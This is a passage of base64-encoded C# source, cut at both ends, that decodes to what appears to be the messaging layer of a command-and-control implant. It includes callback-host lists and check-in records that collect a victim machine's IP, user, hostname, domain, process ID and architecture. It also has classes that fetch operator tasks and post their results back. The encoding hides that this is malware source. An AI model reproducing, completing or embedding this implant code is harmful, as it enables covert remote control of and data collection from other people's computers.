QgaSA9IDA7IGkgPCBsZW47IGkrKykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBjID0gdmFsdWVbaV07DQogICAgICAgICAgICAgICAgaWYgKGMgPj0gMCAmJiBjIDw9IDcgfHwgYyA9PSAxMSB8fCBjID49IDE0ICYmIGMgPD0gMzEgfHwgYyA9PSAzOSB8fCBjID09IDYwIHx8IGMgPT0gNjIpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBzYi5BcHBlbmRGb3JtYXQoIlxcdXswOng0fSIsIChpbnQpYyk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHN3aXRjaCAoKGludCljKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBjYXNlIDg6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2IuQXBwZW5kKCJcXGIiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgOToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzYi5BcHBlbmQoIlxcdCIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAxMDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzYi5BcHBlbmQoIlxcbiIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAxMjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzYi5BcHBlbmQoIlxcZiIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAxMzoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzYi5BcHBlbmQoIlxcciIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAzNDoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzYi5BcHBlbmQoIlxcXCIiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgOTI6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2IuQXBwZW5kKCJcXFxcIik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNiLkFwcGVuZChjKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiBzYi5Ub1N0cmluZygpOw0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyB2b2lkIEdldFNlcnZlcnMoKQ0KICAgICAgICB7DQogICAgICAgICAgICBmb3JlYWNoIChzdHJpbmcgZG9tYWluIGluIENvbmZpZy5DYWxsYmFja0hvc3RzKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFNlcnZlciBzZXJ2ZXIgPSBuZXcgU2VydmVyDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBkb21haW4gPSBkb21haW4sDQogICAgICAgICAgICAgICAgICAgIGNvdW50ID0gMA0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgQ29uZmlnLlNlcnZlcnMuQWRkKHNlcnZlcik7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgU2VydmVyDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgZG9tYWluIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBpbnQgY291bnQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIGNsYXNzIENoZWNrSW4NCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBhY3Rpb24geyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBpcCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIG9zIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgdXNlciB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGhvc3QgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBkb21haW4geyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGludCBwaWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyB1dWlkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYXJjaGl0ZWN0dXJlIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBKc29uRm9ybWF0ID0gQCJ7eyIiYWN0aW9uIiI6IiJ7MH0iIiwiImlwIiI6IiJ7MX0iIiwiIm9zIiI6IiJ7Mn0iIiwiInVzZXIiIjoiInszfSIiLCIiaG9zdCIiOiIiezR9IiIsIiJkb21haW4iIjoiIns1fSIiLCIicGlkIiI6ezZ9LCIidXVpZCIiOiIiezd9IiIsIiJhcmNoaXRlY3R1cmUiIjoiIns4fSIifX0iOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBUb0pzb24oQ2hlY2tJbiBjaGVja2luKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiBTdHJpbmcuRm9ybWF0KA0KICAgICAgICAgICAgICAgICAgICBjaGVja2luLkpzb25Gb3JtYXQsDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUoY2hlY2tpbi5hY3Rpb24pLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKGNoZWNraW4uaXApLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKGNoZWNraW4ub3MpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKGNoZWNraW4udXNlciksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUoY2hlY2tpbi5ob3N0KSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZShjaGVja2luLmRvbWFpbiksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUoY2hlY2tpbi5waWQuVG9TdHJpbmcoKSksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUoY2hlY2tpbi51dWlkKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZShjaGVja2luLmFyY2hpdGVjdHVyZSkNCiAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCg0KICAgICAgICBwdWJsaWMgY2xhc3MgQ2hlY2tJblJlc3BvbnNlDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYWN0aW9uIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgaWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBzdGF0dXMgeyBnZXQ7IHNldDsgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBDaGVja0luUmVzcG9uc2VGb3JtYXQgPSBAInt7IiJzdGF0dXMiIjogIiJ7MH0iIiwgIiJpZCIiOiAiInsxfSIiLCAiImFjdGlvbiIiOiAiInsyfSIifX0iOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIExpc3Q8c3RyaW5nPiBQYXJzZShzdHJpbmcgZGF0YSwgc3RyaW5nIGZvcm1hdCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBmb3JtYXQgPSBSZWdleC5Fc2NhcGUoZm9ybWF0KS5SZXBsYWNlKCJcXHsiLCAieyIpOw0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInswfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MH0iLCAiKD8nZ3JvdXAwJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezF9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsxfSIsICIoPydncm91cDEnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7Mn0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezJ9IiwgIig\/J2dyb3VwMicuKikiKTsgfQ0KICAgICAgICAgICAgICAgIE1hdGNoIG1hdGNoID0gbmV3IFJlZ2V4KGZvcm1hdCkuTWF0Y2goZGF0YSk7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IG1hdGNoZXMgPSBuZXcgTGlzdDxzdHJpbmc+KCk7DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMCJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMSJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDEiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDIiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAyIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG1hdGNoZXM7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgQ2hlY2tJblJlc3BvbnNlIEZyb21Kc29uKHN0cmluZyBtZXNzYWdlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBwYXJzZUxpc3QgPSBDaGVja0luUmVzcG9uc2UuUGFyc2UobWVzc2FnZSwgQ2hlY2tJblJlc3BvbnNlRm9ybWF0LlJlcGxhY2UoInt7IiwgInsiKS5SZXBsYWNlKCJ9fSIsICJ9IikpOw0KICAgICAgICAgICAgICAgIGlmIChwYXJzZUxpc3QuQ291bnQgIT0gMykgeyByZXR1cm4gbnVsbDsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBuZXcgQ2hlY2tJblJlc3BvbnNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBzdGF0dXMgPSBwYXJzZUxpc3RbMF0sDQogICAgICAgICAgICAgICAgICAgIGlkID0gcGFyc2VMaXN0WzFdLA0KICAgICAgICAgICAgICAgICAgICBhY3Rpb24gPSBwYXJzZUxpc3RbMl0NCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIGNsYXNzIEdldFRhc2tpbmcNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBhY3Rpb24geyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGludCB0YXNraW5nX3NpemUgeyBnZXQ7IHNldDsgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIEpzb25Gb3JtYXQgPSBAInt7IiJhY3Rpb24iIjoiInswfSIiLCIidGFza2luZ19zaXplIiI6ezF9fX0iOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBUb0pzb24oR2V0VGFza2luZyBnZXRfdGFza2luZykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gU3RyaW5nLkZvcm1hdCgNCiAgICAgICAgICAgICAgICAgICAgZ2V0X3Rhc2tpbmcuSnNvbkZvcm1hdCwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZShnZXRfdGFza2luZy5hY3Rpb24pLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKGdldF90YXNraW5nLnRhc2tpbmdfc2l6ZS5Ub1N0cmluZygpKQ0KICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgR2V0VGFza2luZ1Jlc3BvbnNlDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYWN0aW9uIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBMaXN0PFRhc2s+IHRhc2tzIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIEdldFRhc2tpbmdSZXNwb25zZSgpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdGFza3MgPSBuZXcgTGlzdDxUYXNrPigpOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZXRUYXNraW5nUmVzcG9uc2VGb3JtYXQgPSBAInt7IiJhY3Rpb24iIjogIiJ7MH0iIiwgIiJ0YXNrcyIiOiB7MX19fSI7DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgTGlzdDxzdHJpbmc+IFBhcnNlKHN0cmluZyBkYXRhLCBzdHJpbmcgZm9ybWF0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGZvcm1hdCA9IFJlZ2V4LkVzY2FwZShmb3JtYXQpLlJlcGxhY2UoIlxceyIsICJ7Iik7DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezB9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInswfSIsICIoPydncm91cDAnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MX0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezF9IiwgIig\/J2dyb3VwMScuKikiKTsgfQ0KICAgICAgICAgICAgICAgIE1hdGNoIG1hdGNoID0gbmV3IFJlZ2V4KGZvcm1hdCkuTWF0Y2goZGF0YSk7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IG1hdGNoZXMgPSBuZXcgTGlzdDxzdHJpbmc+KCk7DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMCJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMSJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDEiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbWF0Y2hlczsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBHZXRUYXNraW5nUmVzcG9uc2UgRnJvbUpzb24oc3RyaW5nIG1lc3NhZ2UpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IHBhcnNlTGlzdCA9IEdldFRhc2tpbmdSZXNwb25zZS5QYXJzZShtZXNzYWdlLCBHZXRUYXNraW5nUmVzcG9uc2VGb3JtYXQuUmVwbGFjZSgie3siLCAieyIpLlJlcGxhY2UoIn19IiwgIn0iKSk7DQogICAgICAgICAgICAgICAgaWYgKHBhcnNlTGlzdC5Db3VudCAhPSAyKSB7IHJldHVybiBudWxsOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBHZXRUYXNraW5nUmVzcG9uc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGFjdGlvbiA9IHBhcnNlTGlzdFswXSwNCiAgICAgICAgICAgICAgICAgICAgdGFza3MgPSBUYXNrLlBhcnNlVGFza3MocGFyc2VMaXN0WzFdKQ0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgUG9zdFJlc3BvbnNlDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYWN0aW9uIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBMaXN0PFRhc2tSZXNwb25zZT4gcmVzcG9uc2VzIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIFBvc3RSZXNwb25zZSgpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmVzcG9uc2VzID0gbmV3IExpc3Q8VGFza1Jlc3BvbnNlPigpOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIEpzb25Gb3JtYXQgPSBAInt7IiJhY3Rpb24iIjoiInswfSIiLCIicmVzcG9uc2VzIiI6W3sxfV19fSI7DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFRvSnNvbihQb3N0UmVzcG9uc2UgcG9zdF9yZXNwb25zZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBzdHJpbmcgcmVzcG9uc2VzID0gIiI7DQogICAgICAgICAgICAgICAgaW50IGNvdW50ID0gMDsNCiAgICAgICAgICAgICAgICBmb3JlYWNoIChUYXNrUmVzcG9uc2UgdGFza19yZXNwb25zZSBpbiBwb3N0X3Jlc3BvbnNlLnJlc3BvbnNlcykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGlmICgoY291bnQgKyAxKSA9PSBwb3N0X3Jlc3BvbnNlLnJlc3BvbnNlcy5Db3VudCkNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2VzICs9IFRhc2tSZXNwb25zZS5Ub0pzb24odGFza19yZXNwb25zZSk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICByZXNwb25zZXMgKz0gVGFza1Jlc3BvbnNlLlRvSnNvbih0YXNrX3Jlc3BvbnNlKSArICcsJzsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICArK2NvdW50Ow0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICByZXR1cm4gIntcImFjdGlvblwiOiBcIiIgKyBwb3N0X3Jlc3BvbnNlLmFjdGlvbiArICJcIiwgXCJyZXNwb25zZXNcIjogWyIgKyByZXNwb25zZXMgKyAiXX0iOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIGNsYXNzIFBvc3RSZXNwb25zZVJlc3BvbnNlDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYWN0aW9uIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBMaXN0PFJlc3BvbnNlPiByZXNwb25zZXMgeyBnZXQ7IHNldDsgfQ0KDQogICAgICAgICAgICBwdWJsaWMgUG9zdFJlc3BvbnNlUmVzcG9uc2UoKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJlc3BvbnNlcyA9IG5ldyBMaXN0PFJlc3BvbnNlPigpOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBQb3N0UmVzcG9uc2VSZXNwb25zZUZvcm1hdCA9IEAie3siImFjdGlvbiIiOiAiInswfSIiLCAiInJlc3BvbnNlcyIiOiB7MX19fSI7DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgTGlzdDxzdHJpbmc+IFBhcnNlKHN0cmluZyBkYXRhLCBzdHJpbmcgZm9ybWF0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGZvcm1hdCA9IFJlZ2V4LkVzY2FwZShmb3JtYXQpLlJlcGxhY2UoIlxceyIsICJ7Iik7DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezB9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInswfSIsICIoPydncm91cDAnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MX0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezF9IiwgIig\/J2dyb3VwMScuKikiKTsgfQ0KICAgICAgICAgICAgICAgIE1hdGNoIG1hdGNoID0gbmV3IFJlZ2V4KGZvcm1hdCkuTWF0Y2goZGF0YSk7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IG1hdGNoZXMgPSBuZXcgTGlzdDxzdHJpbmc+KCk7DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMCJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMSJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDEiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbWF0Y2hlczsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBQb3N0UmVzcG9uc2VSZXNwb25zZSBGcm9tSnNvbihzdHJpbmcgbWVzc2FnZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gcGFyc2VMaXN0ID0gUG9zdFJlc3BvbnNlUmVzcG9uc2UuUGFyc2UobWVzc2FnZSwgUG9zdFJlc3BvbnNlUmVzcG9uc2VGb3JtYXQuUmVwbGFjZSgie3siLCAieyIpLlJlcGxhY2UoIn19IiwgIn0iKSk7DQogICAgICAgICAgICAgICAgaWYgKHBhcnNlTGlzdC5Db3VudCAhPSAyKSB7IHJldHVybiBudWxsOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBQb3N0UmVzcG9uc2VSZXNwb25zZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgYWN0aW9uID0gcGFyc2VMaXN0WzBdLA0KICAgICAgICAgICAgICAgICAgICByZXNwb25zZXMgPSBSZXNwb25zZS5QYXJzZVJlc3BvbnNlcyhwYXJzZUxpc3RbMV0pDQogICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBUYXNrIA0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGNvbW1hbmQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBwYXJhbWV0ZXJzIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgaWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyB0aW1lc3RhbXAgeyBnZXQ7IHNldDsgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBUYXNrRm9ybWF0ID0gQCJ7eyIiY29tbWFuZCIiOiAiInswfSIiLCAiInBhcmFtZXRlcnMiIjogIiJ7e3sxfX19IiIsICIiaWQiIjogIiJ7Mn0iIiwgIiJ0aW1lc3RhbXAiIjogezN9fX0iOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIExpc3Q8c3RyaW5nPiBQYXJzZShzdHJpbmcgZGF0YSwgc3RyaW5nIGZvcm1hdCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBmb3JtYXQgPSBSZWdleC5Fc2NhcGUoZm9ybWF0KS5SZXBsYWNlKCJcXHsiLCAieyIpOw0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInswfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MH0iLCAiKD8nZ3JvdXAwJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezF9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsxfSIsICIoPydncm91cDEnLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7Mn0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezJ9IiwgIig\/J2dyb3VwMicuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInszfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7M30iLCAiKD8nZ3JvdXAzJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgTWF0Y2ggbWF0Y2ggPSBuZXcgUmVnZXgoZm9ybWF0KS5NYXRjaChkYXRhKTsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gbWF0Y2hlcyA9IG5ldyBMaXN0PHN0cmluZz4oKTsNCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDAiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMSJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMiJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDIiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDMiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAzIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG1hdGNoZXM7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgTGlzdDxUYXNrPiBQYXJzZVRhc2tzKHN0cmluZyB0YXNrc19qc29uKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGlmICh0YXNrc19qc29uID09ICJbXSIpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gbnVsbDsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdGFza3NfanNvbiA9IHRhc2tzX2pzb24uUmVwbGFjZSgiWyIsIEAiIikuUmVwbGFjZSgiXSIsIEAiIik7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIExpc3Q8VGFzaz4gdGFza3MgPSBuZXcgTGlzdDxUYXNrPigpOw0KICAgICAgICAgICAgICAgIHN0cmluZ1tdIHRhc2tzX3NwbGl0ID0gdGFza3NfanNvbi5TcGxpdChuZXdbXSB7ICJ9LCIgfSwgU3RyaW5nU3BsaXRPcHRpb25zLlJlbW92ZUVtcHR5RW50cmllcyk7DQogICAgICAgICAgICAgICAgaW50IGNvdW50ID0gMDsNCiAgICAgICAgICAgICAgICBmb3JlYWNoIChzdHJpbmcgdGFzayBpbiB0YXNrc19zcGxpdCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBwYXJzZUxpc3QgPSBuZXcgTGlzdDxzdHJpbmc+IHsgfTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGNvdW50ICsgMSAhPSB0YXNrc19zcGxpdC5MZW5ndGgpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHBhcnNlTGlzdCA9IFRhc2suUGFyc2UodGFzayArICJ9IiwgVGFza0Zvcm1hdC5SZXBsYWNlKCJ7eyIsICJ7IikuUmVwbGFjZSgifX0iLCAifSIpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwYXJzZUxpc3RbMF0gPT0gIiIpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nIG